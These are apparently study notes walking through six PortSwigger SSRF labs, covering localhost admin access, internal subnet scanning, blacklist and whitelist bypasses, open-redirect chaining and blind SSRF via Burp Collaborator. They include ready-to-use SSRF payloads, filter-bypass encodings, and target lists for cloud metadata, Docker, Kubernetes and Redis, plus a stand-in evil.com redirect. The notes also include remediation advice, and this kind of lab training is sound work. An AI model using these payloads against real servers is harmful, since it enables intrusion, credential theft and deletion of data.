# 📘 SSRF Lab-1 (Server-Side Request Forgery) — Full Notes

## 🟪 One‑Line Summary
> **SSRF lets attackers make the server send requests to internal URLs, often bypassing authentication and gaining admin access.**

---

## 🟦 What is SSRF?
SSRF (Server-Side Request Forgery) is a vulnerability where an attacker tricks the server into sending HTTP requests on its behalf.

- Attacker CANNOT reach internal systems directly.
- But server CAN.
- So attacker forces the server to request hidden/internal URLs.

Example vulnerable parameter:
```
stockApi=http://api.company.com/check?product=1
```

If changing the URL changes what the server loads → SSRF exists.

---

## 🟥 Why SSRF Matters (Why It’s Dangerous)
With SSRF, attackers can:

- Access **internal admin panels**
- Access **internal-only microservices**
- Read **sensitive files / metadata**
- Perform **privileged actions** as the server
- Bypass authentication using `localhost`
- Potentially escalate to **RCE**

Some SSRF → complete cloud account takeover.

---

## 🟧 Real‑World Scenarios (Where SSRF Happens)
### 🏦 Banks / FinTech
Internal services:
- transaction approval
- admin dashboards
- audit logs

### 🛒 E‑Commerce (just like the lab)
- stock APIs
- pricing APIs
- /admin dashboards
- /internal-ui

### 🏥 Healthcare
- patient records
- doctor API dashboards
- lab result systems

### 🏢 Enterprise SaaS
- employee admin systems
- billing panels
- internal analytics
- feature toggles

One SSRF → unrestricted internal access.

---

## 🟥 Common SSRF Payloads
```
http://localhost/
http://127.0.0.1/
http://169.254.169.254/     # Cloud metadata
file:///etc/passwd
http://internal-service/admin
```

---

## 🔥 High‑Value Endpoints (Priority Targets in Real World)
### 🔥 Priority 1
```
/admin
/internal
/config
/debug
/system
/manage
/api/admin/
```

### 🔥 Priority 2 — Internal Ports
```
8000–9000
5000–5001
3000
15672
8080/8443
```

### 🔥 Priority 3 — Cloud Metadata
```
169.254.169.254          # AWS
169.254.169.254/computeMetadata     # GCP
169.254.169.254/metadata/identity   # Azure
```

---

## 🟩 How SSRF Works (Simple Explanation)
A feature accepts a URL from the user → backend fetches it → attacker points it to localhost/internal systems.

Example:
```
stockApi=http://localhost/admin
```

Why it works:
- many apps trust localhost
- internal admin panels often skip auth if request is internal
- backend → makes request BEFORE frontend auth checks

---

## 🟦 SSRF Loopback Attack (Against Server Itself)
Payload:
```
http://localhost/admin
```

Benefits:
- bypass login
- retrieve admin area
- perform admin actions via SSRF request

---

# 🟨 LAB WALKTHROUGH (PortSwigger Basic SSRF)

## 🎯 Goal
Use SSRF via stock checker → access admin panel → delete user **carlos**.

## ✔ Vulnerable Parameter
```
stockApi=
```

## 🛠 Steps
1. Open any product → **Check Stock**
2. Intercept request → **Send to Repeater**
3. Replace parameter:
   ```
   stockApi=http://localhost/admin
   ```
4. Send → Admin panel HTML appears (SSRF confirmed)
5. Locate delete link:
   ```
   /admin/delete?username=carlos
   ```
6. Trigger delete:
   ```
   stockApi=http://localhost/admin/delete?username=carlos
   ```
7. Send → Carlos deleted → **Lab solved**

---

## 🟫 Why This Lab Is Vulnerable
- Server accepts user-supplied URL.
- Server automatically performs internal requests.
- Auth bypass happens because localhost is trusted.
- Backend fetch happens BEFORE auth enforcement.

---

# 🖼 Evidence (Screenshot Placeholder)

### Screenshot-1
![SSRF: server fetched localhost admin page](../images/ssrf-lab1-localhost-admin.png)  
   (Screenshot: modified stockApi → server fetched admin HTML showing admin links.)

### Screenshot-2
![SSRF: triggered internal delete via stockApi](../images/ssrf-lab1-trigger-delete.png)  
   (Screenshot: second SSRF showing delete request/response and confirmation that carlos was removed.)   

---

# 🟩 Remediation (How to Prevent SSRF)
### ✔ Allowlist URLs (strongest)
Only allow pre-approved domains:
```
api.company.com
assets.company.com
```

### ✔ Block internal IPs
```
127.0.0.1
10.0.0.0/8
192.168.0.0/16
169.254.169.254
```

### ✔ Network-level egress filtering
- block metadata
- block internal-only ports

### ✔ Sanitize & validate URL inputs
- restrict protocols (no file://, gopher://, ftp://)
- block redirect-based SSRF
- resolve IP before allowlist check

---

# ⭐ Real‑World Flowchart (Mental Model)

> **If the app fetches a URL → you control the server’s browser → you can access everything the server can.**

---

# 📘 SSRF Lab-2 (Internal Network Scan & Pivoting) — Full Write-Up

## 🟪 One-Line Summary
> **This SSRF allows scanning internal `192.168.0.X` systems and accessing hidden admin panels on port 8080, leading to full account deletion using an encoded admin payload.**

---

## 🟦 What Is This Topic?
This lab focuses on **SSRF → Internal Network Pivoting**, where the backend fetches URLs supplied by the user.

Private internal ranges:
```
192.168.0.0 – 192.168.0.255
10.0.0.0 – 10.255.255.255
172.16.0.0 – 172.31.255.255
```

These internal hosts typically run:
- Admin panels  
- Internal APIs  
- Dev dashboards  
- Database interfaces  
- Message brokers  
- Cloud metadata  

SSRF allows attackers to **reach these machines as if they are inside the network**.

---

## 🟥 Why This Matters
This lab demonstrates the most dangerous real-world SSRF scenario:

- Scan internal networks from outside  
- Find hidden admin ports  
- Bypass firewall protections  
- Access internal dashboards  
- Delete users without authentication  
- Perform full internal pivoting  

This is exactly how **Capital One’s SSRF breach** happened.

---

## 🟧 Real-World Scenarios (Where This Happens)
### 🏦 Banks
Internal servers serving:
- AML dashboards  
- Transaction approval endpoints  
- Account editing forms  

### 🏥 Healthcare
Internal-only:
- Patient records  
- Lab systems  
- FHIR APIs  

### 🛒 E-Commerce
- Stock management  
- Inventory admin  
- Pricing engines  

### 🏢 Enterprise SaaS
- Hidden admin panels  
- Billing engines  
- Debug dashboards  

---

## 🟥 Common SSRF Payloads
```
http://192.168.0.1/
http://10.0.0.5:8080/admin
http://127.0.0.1:5000/
http://169.254.169.254/latest/meta-data/
```

---

## 🔥 High-Value Endpoints
### Internal Admin Paths
```
/admin
/administrator
/manage
/dashboard
/console
/control
```

### Critical Ports
```
8080 – Admin panels, Tomcat
8000 – Internal APIs
5000 – Dev/Flask
3000 – Node dashboards
9000 – Dev servers
9200 – Elasticsearch
27017 – MongoDB
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
```

---

# 🟨 LAB WALKTHROUGH — PortSwigger: SSRF With Internal Network Scan

## 🎯 Goal
- Scan internal IP range → find admin running on **port 8080**  
- Access:  
  `http://192.168.0.X:8080/admin`  
- Delete user *carlos* using encoded SSRF payload

---

# 🟧 STEP 1 — Intercept the Stock Check Request
1. Open a product page  
2. Click **Check Stock**  
3. Intercept → **Send to Intruder**

You now control:
```
stockApi=
```

---

# 🟦 STEP 2 — Set Internal IP Scan Range
Modify request to:
```
stockApi=http://192.168.0.1:8080/admin
```

Highlight the last octet (**1**) → click **Add §**.

---

# 🟩 STEP 3 — Configure Intruder Payload
- Payload type: **Numbers**  
- From: **1**  
- To: **255**  
- Step: **1**

You will now scan the entire subnet.

---

# 🟥 STEP 4 — Run The Scan
Click **Start Attack**

Sort by **Status**:

- Most responses: `500 / 404 / 302`
- Exactly **one response**: `200 OK`

This means **this IP hosts the admin panel**.

Example discovered target:
```
http://192.168.0.57:8080/admin
```

---

# 🟧 STEP 5 — Access Admin Panel via SSRF
Send the 200 OK request to **Repeater**.

Check:
```
stockApi=http://192.168.0.57:8080/admin
```

Repeater returns **admin page HTML** → SSRF working.

---

# 🟩 STEP 6 — Delete the User (Encoded Payload)
The admin delete function typically looks like:
```
/admin/delete?username=carlos
```

But due to firewall/WAF, we encode the query string:

```
/admin/delete%3Fusername%3Dcarlos
```

Final exploit:
```
stockApi=http://192.168.0.57:8080/admin/delete%3Fusername%3Dcarlos
```

Send → user **carlos deleted** → **Lab solved**.

---

### 🖼 Evidence Screenshot #2 (Encoded Delete Payload)

### Screenshot-1
![SSRF — discovered delete link in returned HTML](../images/ssrf-lab2-found-delete-link.png)  
(Screenshot 1: HTML/Elements view showing the /delete?username=carlos link.)

### Screenshot-2
![SSRF — triggered delete via stockApi, verified carlos removed](../images/ssrf-lab2-solved.png)  
(Screenshot 2: final SSRF request/response showing the delete action executed and confirmation.)

---

# 🟫 Why This Lab Is Vulnerable
- Backend trusts internal networks  
- Server fetches URLs directly from user input  
- No allowlist  
- No internal IP filtering  
- Admin panel on 8080 does not require authentication  

This is **real pentesting gold**.

---

# ⭐ Real-World Pentesting Knowledge From This Lab
You learned:
- Internal IP scanning via SSRF  
- Identifying reachable internal services  
- Pivoting deeper into the network  
- Admin dashboard abuse  
- Query parameter encoding to bypass filters  

This is 1:1 with real-world SSRF exploitation.

---

# 🟩 Remediation
### ✔ URL Allowlist
Allow only:
```
https://api.company.com
```

### ✔ Block Internal IP Ranges (RFC1918)
```
10.0.0.0/8
192.168.0.0/16
172.16.0.0/12
```

### ✔ Egress Firewall Filtering
Block server from accessing:
- metadata endpoints  
- internal admin ports  
- dev servers  

### ✔ Strip dangerous protocols
No:
```
file://
gopher://
ftp://
```

### ✔ Validate then resolve domain
Resolve DNS → check IP → confirm it’s allowed.

---

# 🟪 Mental Model Summary
> If you can control even one URL parameter → you control the server’s internal browser → scan & attack the entire internal network.

---

# ⭐ SSRF Lab-3 – Blacklist Filter Bypass (Alternate IPs + Double Encoding)

---

## 🟩 1. ONE LINE SUMMARY
Bypass SSRF blacklist filters using **alternate IP formats (127.1)** and **double-encoding (%2561dmin)** to access the internal admin panel and delete a user.

---

## 🟦 2. WHAT IS THIS TOPIC?
This topic is about **Server-Side Request Forgery (SSRF)** where the web app tries to block dangerous internal URLs using a **blacklist** such as:

- `localhost`
- `127.0.0.1`
- `/admin`

Attackers easily bypass this by using:
- Alternate IP notations  
- Encoded paths  
- Double URL encoding  

---

## 🟪 3. WHY THIS MATTERS?
Blacklists DO NOT WORK.

Attackers can still reach:
- Internal admin dashboards  
- Cloud metadata APIs  
- Debug endpoints  
- Internal microservices  

A blacklist always misses some alternate form.  
A skilled attacker only needs ONE bypass to gain internal access.

---

## 🟫 4. REAL-WORLD SCENARIOS
### 🔹 Scenario 1 — WAF blocks localhost, attacker uses 127.1  
WAF blocks:
- `localhost`
- `127.0.0.1`  

Attacker uses:
```
http://127.1/admin
```

### 🔹 Scenario 2 — Keyword "admin" is blocked, attacker double-encodes
```
/%2561dmin
```
Decoder: `%25` → `%` → `%61` → `a` → becomes `/admin`.

### 🔹 Scenario 3 — Redirect-based SSRF bypass  
Attacker redirects via:
```
evil.com/redirect → 302 → http://127.1/admin
```
Server follows redirect → bypass win.

### 🔹 Scenario 4 — Alternate encodings of internal IP  
Integer form:
```
http://2130706433/
```

Octal form:
```
http://017700000001/
```

Metadata accessed anyway.

---

## 🟥 5. COMMON SSRF BLACKLIST BYPASS PAYLOADS
```
127.1
127.0.1
127.00.00.01
2130706433
017700000001
%2561dmin
%2e%2e%2fadmin
```

---

## 🟧 6. HIGH VALUE INTERNAL ENDPOINTS
```
127.1/admin
127.1/dashboard
localhost/manager/html
169.254.169.254/latest/meta-data/
127.1/debug
127.1/actuator/env
127.1:5000/api/internal
```

---

## 🟨 7. LAB WALKTHROUGH (STEP-BY-STEP)

### 🔸 Step 1 — Open product → Check Stock  
Intercept request → **Send to Repeater**.

### 🔸 Step 2 — Try localhost (blocked)
```
http://127.0.0.1/
```
Response: ❌ Blocked by blacklist.

### 🔸 Step 3 — Bypass using short IP  
```
http://127.1/
```
Response: ✅ Works.

### 🔸 Step 4 — Try admin (blocked)
```
http://127.1/admin
```
Response: ❌ Keyword "admin" blocked.

### 🔸 Step 5 — Double encode “a” → bypass blacklist  
```
/admin  
a → %61  
Double encoded: %2561
```

Final path:
```
http://127.1/%2561dmin
```

### 🔸 Step 6 — Delete Carlos  
```
http://127.1/%2561dmin/delete?username=carlos
```
Send → User deleted → Lab solved.

---

## 🟩 8. EVIDENCE (SCREENSHOT)
![SSRF Blacklist Bypass Screenshot](../images/ssrf-blacklist-bypass.png)

---

## 🟦 9. REMEDIATION
- ❗ Replace blacklist with **strict allowlist**
- Restrict outbound traffic from server  
- Block **ALL** internal IP ranges (RFC1918)  
- Disable redirects  
- Validate URL AFTER DNS + after redirect  
- Enforce egress firewall rules  

---

# ⭐ SSRF Lab-4 (Open Redirect → Internal Admin Bypass)

---

## 🔹 One-line summary
Use an open-redirect endpoint to bypass SSRF restrictions and make the server request an internal admin panel, then delete user **carlos**.

---

## 🔹 What is this topic? (short)
The application exposes a SSRF sink via:
```
stockApi=
```
but restricts it to same-origin *paths* only.  
Separately, an endpoint:
```
/product/nextProduct?path=<VALUE>
```
reflects `<VALUE>` into the `Location:` header (open redirect).  
Chaining the SSRF sink with this **open redirect** lets the backend follow the redirect to internal hosts (e.g., `http://192.168.0.12:8080/admin`).

---

## 🔹 Why this matters (real-world risk)
- Redirect parameters are often trusted and ignored by devs.  
- Backends commonly follow redirects automatically.  
- SSRF + open-redirect = full internal access (admin panels, metadata, dev tools).  
- Attackers can delete users, read secrets, pivot laterally, or exfiltrate cloud credentials.

---

## 🔹 Real-world scenarios (out-of-the-box)
- Marketing redirect `/go?to=` chained with SSRF → internal banking endpoints.  
- Image/next-product redirect that can point to `http://169.254.169.254/latest/meta-data/`.  
- Redirect chains that transform “same-origin” path into arbitrary remote URL.  
- Mobile apps blocking external domains but allowing same-origin paths → bypass via redirect.

---

## 🔹 Common payloads / attack patterns
```
/product/nextProduct?path=http://192.168.0.12:8080/admin
/product/nextProduct?path=http://127.0.0.1:8080/admin
/product/nextProduct?path=http://169.254.169.254/latest/meta-data/
```

Encoded delete payload example (percent-encoded `?`):
```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
```

Final SSRF sink payload (insert into `stockApi=`):
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
```

---

## 🔹 High-value endpoints to try after redirect bypass
```
/admin
/admin/delete?username=...
/manage
/debug
/actuator/env
/metrics
/swagger
169.254.169.254/latest/meta-data/
127.0.0.1:2375/containers/json
kubernetes.default.svc/api
```

---

## 🔹 Lab walkthrough — exact steps (copy-paste ready)

1. **Capture baseline stock request**  
   - Proxy **ON** → Click *Check stock* on any product. Capture request and **Send to Repeater**.

2. **Confirm SSRF sink only accepts same-origin paths**  
   - Try:
     ```
     stockApi=http://192.168.0.12:8080/admin
     ```
     → Expect: **blocked / rejected** (server only allows `/product/*` paths).

3. **Find open redirect**  
   - Navigate product → Click *Next product*. Intercept:
     ```
     GET /product/nextProduct?path=/product?productId=2
     ```
     - Response header:
       ```
       Location: /product?productId=2
       ```
     - **SS#1:** take screenshot showing the captured redirect and `Location:` header.

4. **Craft redirect payload pointing to internal admin**  
   - Replace `path=` value:
     ```
     /product/nextProduct?path=http://192.168.0.12:8080/admin
     ```
   - Confirm calling that path (as same-origin) will return a redirect leading to the admin host.

5. **Insert redirect payload into SSRF sink**  
   - Final SSRF invocation:
     ```
     stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
     ```
   - Send request in Repeater after URL encode → confirm admin HTML returned (SSRF follows redirect).

6. **Encode delete action and send via SSRF**  
   - Percent-encode query-string `?` and `=` to avoid filter issues:
     ```
     /product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
     ```
   - Put into sink:
     ```
     stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
     ```
   - **SS#2:** take screenshot showing Repeater request with encoded payload and the response confirming deletion.
   - Result: **Carlos deleted** → Lab solved.

---

## 🔹 PoC / Repeater-ready example (copy/paste & edit)
```http
GET /product/stock/check?productId=1&storeId=1 HTTP/1.1
Host: <LAB_HOST>
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
```

> Note: URL-encode payloads when pasting into a browser. Use `%3F` for `?`, `%3D` for `=`, etc., if required by the app/WAF.

---

## 🔹 Evidence (Screenshots)
- **SS#1 — Open Redirect discovered**  
  
  ![open redirect path](../images/ssrf-open-redirect-path.png)
  
- **SS#2 — Encoded SSRF -> Admin delete**  
  
 ![stock api open redirect path replace url encode](../images/ssrf-admin-delete.png)
  
---

## 🔹 Troubleshooting / tips
- If redirects are relative, prefix with `http://<HOST>` when testing.  
- If server strips `http://`, try `//192.168.0.12:8080/admin` or encoded variants.  
- If WAF blocks `http:`, try double-encoding the `:` or using `//host` style redirect.  
- Watch for multiple redirect hops; capture full redirect chain in Burp.

---

## 🔹 Fixes / remediation (what to report)
- Do **not** accept user-controlled redirect destinations.  
- Disable automatic redirect-following for SSRF-reachable code paths.  
- Use **allowlist** of full URLs (or only allow fixed relative paths).  
- Validate redirect parameters — only allow relative internal paths, never absolute URLs.  
- Apply egress filtering to prevent backend from reaching admin ports and metadata endpoints.  
- Require authentication on internal admin interfaces (don’t assume internal origin = trusted).

---

## 🔹 Pentest checklist (copyable)
1. Find SSRF sink → test same-origin-only behavior.  
2. Search for endpoints that reflect user input into `Location:` headers.  
3. Confirm redirect follow behavior.  
4. Chain redirect inside SSRF sink.  
5. Encode query chars (`?`, `=`) if needed.  
6. Capture PoC requests + responses, take screenshots.  
7. Recommend allowlist + egress filtering + disable redirect follow.

---

## 🔹 One-line memory cue
```
If stockApi follows redirects → point it to a redirect that lands on the internal admin.
```

---

# 🔥 Blind SSRF Lab-5 – OAST (OUT OF BAND TECHNIQUES)

---

## 1. 📝 One-Line Summary
Blind SSRF happens when the backend fetches a URL you control but does **not** return the response to you, requiring out-of-band (OAST) techniques such as Burp Collaborator to detect it.

---

## 2. ❓ What Is This Vulnerability?
Blind SSRF occurs when:

1. You supply a URL (header/parameter).
2. Backend **makes a request** to that URL.
3. But you **don’t see the response**.
4. Only **DNS/HTTP callbacks** confirm it.

The Referer header is used by the analytics system → making it an SSRF sink.

---

## 3. 🎯 Why This Matters
Even without seeing responses, blind SSRF can still allow:

- Internal port scanning  
- Cloud metadata theft  
- Triggering vulnerabilities on internal services  
- Backend HTTP client exploitation  
- Full RCE through crafted responses  

Impact = **Critical**

---

## 4. 🔍 Real-World Scenarios
### • Cloud Metadata Theft  
Request made to:  
`http://169.254.169.254/latest/meta-data/`

### • Internal Jenkins RCE  
`http://10.0.0.5/scriptText?script=...`

### • Redis Cronjob Injection  
Blind SSRF can write cron entries → reverse shell.

### • Log4Shell-style backend exploitation  
Backend logs attacker-controlled response headers.

---

## 5. 🏗️ Step-By-Step Lab Walkthrough

### ✔ Step 1 — Open any product page  
Browser automatically sends a **Referer** header.

### ✔ Step 2 — Send request to Repeater  
Example:
```
GET /product?productId=1 HTTP/2
Referer: https://YOUR-LAB-ID.web-security-academy.net/
```

### ✔ Step 3 — Replace Referer with Collaborator URL  
```
Referer: https://abc123xyz.burpcollaborator.net
```

### ✔ Step 4 — Send request  
Triggers analytics fetch → backend makes outbound request.

### ✔ Step 5 — Poll Burp Collaborator  
Look for:  
- DNS interaction → SSRF exists  
- DNS + HTTP → Fully confirmed blind SSRF  

### ✔ Step 6 — Lab solved when Collaborator receives HTTP interaction.

---

## 6. 📸 Screenshot (Insert Your Image Here)

**Screenshot of Burp Collaborator DNS/HTTP interaction when Referer is replaced with Collaborator URL**

![Burp Collaborator DNS/HTTP interaction](../images/blind-ssrf-dns-hit.png)

---

## 7. 🧲 High-Value Internal Targets

### 🟦 Cloud Metadata  
`169.254.169.254/latest/meta-data/`

### 🟥 Internal Panels  
`http://127.0.0.1:8080/admin`

### 🟨 Docker/Kubernetes  
`http://localhost:2375/containers/json`

### 🟩 Internal Services  
- Redis: 6379  
- MongoDB: 27017  
- Elasticsearch: 9200  
- Jenkins: 8080  

---

## 8. 🔗 Multi-Chain Attack Possibilities
- Blind SSRF → Port Scan → Find Jenkins → RCE  
- Blind SSRF → AWS Metadata → Steal IAM keys → Full cloud takeover  
- Blind SSRF → Redis Cronjob → Reverse shell  
- Blind SSRF → Internal Admin API → Privilege escalation  

---

## 9. 🛡️ Remediation
- Strict allowlisting of outbound domains  
- Block internal IP ranges  
- Disable redirect-following  
- Disallow dangerous protocols (file://, gopher://, ftp://, redis:// etc.)  
- Validate & normalize URLs  
- Use SSRF-safe HTTP clients  

---

## 10. 📌 Final Summary
Blind SSRF is detected using OAST tools like Burp Collaborator by injecting controlled URLs into headers such as **Referer** and observing DNS/HTTP callbacks. Even without responses, attackers can pivot into internal networks, cloud metadata services, or internal admin panels.

---

# 🧠Lab-6 SSRF Whitelist Bypass via URL Parser Confusion

---

## 🔵 OVERVIEW

This lab demonstrates:

- SSRF (Server-Side Request Forgery)
- URL parser confusion
- Whitelist bypass
- Embedded credentials abuse
- Double URL encoding tricks

The application contains:

- stock check functionality
- hostname whitelist validation

BUT:

different parsers interpret the URL differently.

This allows attacker to:

- bypass whitelist validation
- force server to access localhost
- access hidden admin functionality
- delete user: carlos

---

## 🔵 WHAT IS THE TOPIC?

### SSRF — Server-Side Request Forgery

---

### Simple Definition

SSRF happens when:

attacker tricks server into making requests
to locations attacker chooses.

---

### Normal Web Flow

```text
Browser → Website → External Resource
```

---

### SSRF Flow

```text
Attacker input
        ↓
Server processes attacker URL
        ↓
Server sends request internally
        ↓
Access internal/private resources
```

---

### Real-Life Analogy

Imagine:

a restricted building only employees can enter.

Attacker tricks employee into:

opening restricted room for them.

The server becomes:

attacker’s internal proxy.

---

## 🔵 WHY SSRF IS DANGEROUS

Servers can usually access:

| Target | Purpose |
|---|---|
| localhost | internal admin panels |
| 127.0.0.1 | loopback services |
| cloud metadata | AWS/GCP credentials |
| Redis/MongoDB | internal databases |
| Docker APIs | container compromise |

Attackers normally cannot access these directly.

---

# 🧠 IMPORTANT THEORY FOR THIS LAB

---

## Hostname Whitelist Defense

Developer tries to secure requests using:

```text
stock.weliketoshop.net
```

Only this hostname is allowed.

BUT:

validation parser
and
execution parser

interpret the URL differently.

This creates:

👉 parser confusion vulnerability

---

# 🔵 IMPORTANT URL THEORY

---

## Normal URL Structure

```text
http://website.com/page
```

---

## URLs Can Contain Credentials

Format:

```text
http://username:password@host
```

Example:

```text
http://admin:123@google.com
```

---

### Meaning

| Part | Meaning |
|---|---|
| admin | username |
| 123 | password |
| google.com | actual host |

---

## Important Concept

Everything BEFORE:

```text
@
```

is treated as:

👉 credentials

NOT hostname.

---

# 🔵 WHAT IS URL FRAGMENT (#)?

Example:

```text
http://site.com/page#test
```

---

### Meaning

| Part | Meaning |
|---|---|
| http://site.com/page | actual request |
| #test | fragment |

---

### Important Rule

Fragments are usually:

❌ NOT sent to server

They are processed client-side.

---

# 🔵 WHAT IS URL ENCODING?

Special characters become encoded.

Examples:

| Character | Encoded |
|---|---|
| # | %23 |
| space | %20 |

---

## Double Encoding

Encoding an already encoded value.

Example:

```text
# → %23 → %2523
```

because:

```text
% → %25
```

---

## WHY DOUBLE ENCODING MATTERS

Some systems:

- validate BEFORE decoding
- decode AGAIN internally

This creates:

different interpretations
between validation and execution.

---

# 🔵 LAB THEORY

Application:

- validates hostname first
- decodes URL differently later

Attacker abuses this mismatch.

---

# 🔵 LAB WALKTHROUGH (STEP-BY-STEP)

---

## ✅ Step 1 — Open Product

Visit any product page.

Click:

```text
Check stock
```

---

## ✅ Step 2 — Intercept Request

Capture request in Burp Suite.

Send to:

```text
Repeater
```

---

### Original Parameter

```text
stockApi=http://stock.weliketoshop.net/product/stock/check?productId=1
```

---

## ✅ Step 3 — Test localhost

Replace URL with:

```text
http://127.0.0.1/
```

---

### Purpose

Testing whether:

server can access localhost.

---

### Result

Blocked.

Meaning:

hostname whitelist exists.

---

## ✅ Step 4 — Test Embedded Credentials

Use:

```text
http://username@stock.weliketoshop.net/
```

---

### Breaking It Down

| Part | Meaning |
|---|---|
| username | fake credential |
| @ | credential separator |
| stock.weliketoshop.net | hostname |

---

### Result

Accepted.

This reveals:

👉 parser supports credential syntax

Very important clue.

---

## ✅ Step 5 — Test Fragment Character

Use:

```text
http://username#@stock.weliketoshop.net/
```

---

### Result

Rejected.

Meaning:

```text
#
```

changes parser behavior.

---

## ✅ Step 6 — Use Double Encoding

Payload:

```text
http://localhost:80%2523@stock.weliketoshop.net/
```

---

## 🧠 PAYLOAD BREAKDOWN

| Part | Meaning |
|---|---|
| localhost | real target |
| :80 | HTTP port |
| %2523 | double-encoded # |
| @ | parser confusion |
| stock.weliketoshop.net | fake whitelist hostname |

---

## 🧠 VALIDATION PHASE

Whitelist parser sees:

```text
stock.weliketoshop.net
```

✅ Allowed.

---

## 🧠 EXECUTION PHASE

Internal decoding occurs:

```text
%2523 → %23 → #
```

URL conceptually becomes:

```text
http://localhost:80#@stock.weliketoshop.net/
```

---

## IMPORTANT RESULT

Everything after:

```text
#
```

becomes fragment.

Ignored during request.

---

## REAL TARGET

```text
localhost:80
```

💥 SSRF successful.

---

## ✅ Step 7 — Final Exploit Payload

```text
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

---

## 📸 Screenshot

![final-ssrf-payload](../images/final-ssrf-localhost-admin-delete-carlos.png)

---

# 🔥 FINAL PAYLOAD BREAKDOWN

| Part | Purpose |
|---|---|
| localhost | actual target |
| :80 | HTTP port |
| %2523 | encoded fragment |
| @ | parser confusion |
| stock.weliketoshop.net | whitelist bypass |
| /admin/delete | admin endpoint |
| ?username=carlos | delete victim |

---

# 🔵 EXECUTION FLOW

---

## Step 1

Whitelist validation checks:

```text
stock.weliketoshop.net
```

✅ passes.

---

## Step 2

URL internally decoded.

```text
%2523 → #
```

---

## Step 3

Fragment behavior activates.

Everything after:

```text
#
```

ignored.

---

## Step 4

Server requests:

```text
http://localhost/admin/delete?username=carlos
```

---

## Step 5

Admin functionality executes.

Carlos deleted.

💥 Lab solved.

---

# 🔵 VISUAL FLOW

```text
Attacker payload
        ↓
Whitelist parser fooled
        ↓
Internal decoding occurs
        ↓
Fragment truncates hostname
        ↓
Request sent to localhost
        ↓
Internal admin endpoint accessed
        ↓
Carlos deleted
```

---

# 🔵 REAL-WORLD SCENARIOS

---

## ☁️ Cloud Metadata Theft

```text
http://169.254.169.254/
```

Steal:

- AWS credentials
- IAM tokens

---

## 🛠 Internal Admin Panels

Access:

```text
localhost/admin
```

---

## ☸️ Kubernetes Attacks

Target:

internal Kubernetes APIs.

---

## 🗄 Redis Exploitation

Connect to:

```text
127.0.0.1:6379
```

---

## 🔍 Internal Port Scanning

Use SSRF to discover:

- hidden services
- internal ports
- private APIs

---

# 🔵 HIGH-VALUE ENDPOINTS

Common SSRF sinks:

```text
POST /stock
POST /fetch
POST /import
POST /webhook
GET /proxy?url=
POST /image-fetch
POST /url-preview
```

---

# 🔵 IMPORTANT MENTAL MODEL

Whitelist parser
and
request parser

interpret URL differently.

That mismatch creates:

👉 SSRF whitelist bypass

---

# 🔵 REMEDIATION

---

## Proper URL Parsing

Use:

same parser everywhere

for:

- validation
- request execution

---

## Disable Dangerous URL Features

Reject:

- embedded credentials
- fragments
- malformed encodings

---

## Normalize URLs First

Decode before validating.

---

## Strict Allowlist Validation

Validate:

- resolved IP
- final destination
- redirects

---

## Block Internal Targets

Reject:

- localhost
- 127.0.0.1
- internal IP ranges
- cloud metadata IPs

---

# 🔵 ONE-LINE SUMMARY

👉 “This lab exploits SSRF by abusing URL parser confusion using embedded credentials and double-encoded fragments to bypass hostname whitelist validation and force the server to access localhost admin functionality.”
